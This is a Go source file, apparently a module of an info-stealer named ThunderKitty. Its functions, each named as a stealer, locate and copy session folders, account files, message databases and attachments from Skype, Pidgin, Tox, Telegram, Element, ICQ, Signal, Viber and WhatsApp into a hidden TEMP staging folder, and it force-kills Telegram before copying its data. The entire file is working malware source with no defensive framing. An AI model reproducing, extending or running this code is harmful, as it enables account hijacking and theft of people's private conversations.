package Socials

import (
	"os"
	"os/exec"
	"path/filepath"
)

func Run() {
	folderMessaging := filepath.Join(os.Getenv("TEMP"), "ThunderKitty", "SocialMedias")
	skypeStealer(folderMessaging)
	pidginStealer(folderMessaging)
	toxStealer(folderMessaging)
	telegramStealer(folderMessaging)
	elementStealer(folderMessaging)
	icqStealer(folderMessaging)
	signalStealer(folderMessaging)
	viberStealer(folderMessaging)
	whatsappStealer(folderMessaging)
}

func skypeStealer(folderMessaging string) {
	skypeFolder := filepath.Join(os.Getenv("APPDATA"), "microsoft", "skype for desktop")
	if _, err := os.Stat(skypeFolder); os.IsNotExist(err) {
		return
	}
	skypeSession := filepath.Join(folderMessaging, "Skype")
	os.MkdirAll(skypeSession, os.ModePerm)
	copyDir(skypeFolder, skypeSession)
}

func pidginStealer(folderMessaging string) {
	pidginFolder := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", ".purple")
	if _, err := os.Stat(pidginFolder); os.IsNotExist(err) {
		return
	}
	pidginAccounts := filepath.Join(folderMessaging, "Pidgin")
	os.MkdirAll(pidginAccounts, os.ModePerm)
	accountsFile := filepath.Join(pidginFolder, "accounts.xml")
	copyFile(accountsFile, pidginAccounts)
}

func toxStealer(folderMessaging string) {
	toxFolder := filepath.Join(os.Getenv("APPDATA"), "Tox")
	if _, err := os.Stat(toxFolder); os.IsNotExist(err) {
		return
	}
	toxSession := filepath.Join(folderMessaging, "Tox")
	os.MkdirAll(toxSession, os.ModePerm)
	copyDir(toxFolder, toxSession)
}

func telegramStealer(folderMessaging string) {
	processName := "telegram"
	pathtele := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Telegram Desktop", "tdata")
	if _, err := os.Stat(pathtele); os.IsNotExist(err) {
		return
	}
	cmd := exec.Command("taskkill", "/F", "/IM", processName+".exe")
	cmd.Run()

	telegramSession := filepath.Join(folderMessaging, "Telegram")
	os.MkdirAll(telegramSession, os.ModePerm)
	copyDir(pathtele, telegramSession)

	cmd = exec.Command("start", pathtele)
	cmd.Run()
}

func elementStealer(folderMessaging string) {
	elementFolder := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Element")
	if _, err := os.Stat(elementFolder); os.IsNotExist(err) {
		return
	}
	elementSession := filepath.Join(folderMessaging, "Element")
	os.MkdirAll(elementSession, os.ModePerm)
	indexedDB := filepath.Join(elementFolder, "IndexedDB")
	copyDir(indexedDB, elementSession)
	localStorage := filepath.Join(elementFolder, "Local Storage")
	copyDir(localStorage, elementSession)
}

func icqStealer(folderMessaging string) {
	icqFolder := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "ICQ")
	if _, err := os.Stat(icqFolder); os.IsNotExist(err) {
		return
	}
	icqSession := filepath.Join(folderMessaging, "ICQ")
	os.MkdirAll(icqSession, os.ModePerm)
	copyDir(icqFolder, icqSession)
}

func signalStealer(folderMessaging string) {
	signalFolder := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Signal")
	if _, err := os.Stat(signalFolder); os.IsNotExist(err) {
		return
	}
	signalSession := filepath.Join(folderMessaging, "Signal")
	os.MkdirAll(signalSession, os.ModePerm)
	sqlFolder := filepath.Join(signalFolder, "sql")
	copyDir(sqlFolder, signalSession)
	attachmentsFolder := filepath.Join(signalFolder, "attachments.noindex")
	copyDir(attachmentsFolder, signalSession)
	configJson := filepath.Join(signalFolder, "config.json")
	copyFile(configJson, signalSession)
}

func viberStealer(folderMessaging string) {
	viberFolder := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "ViberPC")
	if _, err := os.Stat(viberFolder); os.IsNotExist(err) {
		return
	}
	viberSession := filepath.Join(folderMessaging, "Viber")
	os.MkdirAll(viberSession, os.ModePerm)

	rootFiles, _ := filepath.Glob(filepath.Join(viberFolder, "*.db*"))
	for _, file := range rootFiles {
		copyFile(file, viberSession)
	}

	directories, _ := filepath.Glob(filepath.Join(viberFolder, "*"))
	for _, dir := range directories {
		if fi, err := os.Stat(dir); err == nil && fi.IsDir() {
			copyDir(dir, filepath.Join(viberSession, filepath.Base(dir)))
		}
	}
}

func whatsappStealer(folderMessaging string) {
	whatsappSession := filepath.Join(folderMessaging, "Whatsapp")
	os.MkdirAll(whatsappSession, os.ModePerm)

	regexPattern := `[a-z0-9]+\.[Ww]hatsappDesktop_[a-z0-9]+`
	parentFolders, _ := filepath.Glob(filepath.Join(os.Getenv("LOCALAPPDATA"), "Packages", regexPattern))
	for _, parentFolder := range parentFolders {
		localStateFolders, _ := filepath.Glob(filepath.Join(parentFolder, "**", "LocalState"))
		for _, lsFolder := range localStateFolders {
			profilePicturesFolder, _ := filepath.Glob(filepath.Join(lsFolder, "profilePictures"))
			for _, ppFolder := range profilePicturesFolder {
				profilePicturesDestination := filepath.Join(whatsappSession, filepath.Base(lsFolder), "profilePictures")
				copyDir(ppFolder, profilePicturesDestination)
			}
			filesToCopy, _ := filepath.Glob(filepath.Join(lsFolder, "*.db*"))
			for _, file := range filesToCopy {
				copyFile(file, filepath.Join(whatsappSession, filepath.Base(lsFolder)))
			}
		}
	}
}

func copyDir(src, dst string) {
	cmd := exec.Command("xcopy", src, dst, "/E", "/I", "/Y")
	cmd.Run()
}

func copyFile(src, dst string) {
	cmd := exec.Command("xcopy", src, dst, "/Y")
	cmd.Run()
}